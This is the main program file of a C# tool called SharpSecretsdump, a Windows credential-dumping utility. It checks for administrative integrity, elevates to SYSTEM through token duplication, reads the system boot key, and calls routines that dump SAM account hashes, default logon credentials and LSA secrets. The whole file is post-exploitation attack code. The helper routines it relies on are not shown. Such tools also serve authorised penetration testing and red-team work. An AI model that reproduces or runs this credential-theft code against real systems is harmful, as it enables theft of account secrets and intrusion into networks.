﻿using System;

namespace SharpSecretsdump
{
    class Program
    {
        static void Main(string[] args)
        {
            bool alreadySystem = false;

            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("You need to be in high integrity to extract LSA secrets!");
                return;
            }
            else
            {
                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                bool isSytem = System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;

                if (isSytem)
                {
                    alreadySystem = true;
                }
                else
                {
                    // elevated but not system, so gotta GetSystem() first
                    //Console.WriteLine("[*] Elevating to SYSTEM via token duplication for LSA secret retrieval");
                    if (Helpers.GetSystem() == false)
                    {
                        Console.WriteLine($"Failed to elevate: {currentName}");
                        return;
                    }
                }
            }

            byte[] bootkey = null;
            if (args.Length == 1)
            {
                bootkey = Helpers.StringToByteArray(args[0].Replace("0x", ""));
            }
            else
            {
                bootkey = LSADump.GetBootKey();
            }

            Console.WriteLine($"[*] Target system bootKey: 0x{Helpers.Hexlify(bootkey)}");

            Helpers.GetSamAccounts(bootkey);
            Helpers.GetDefaultLogon();
            Helpers.GetLsaSecrets(bootkey);

            if (!alreadySystem)
            {
                Interop.RevertToSelf();
            }
        }
    }
}
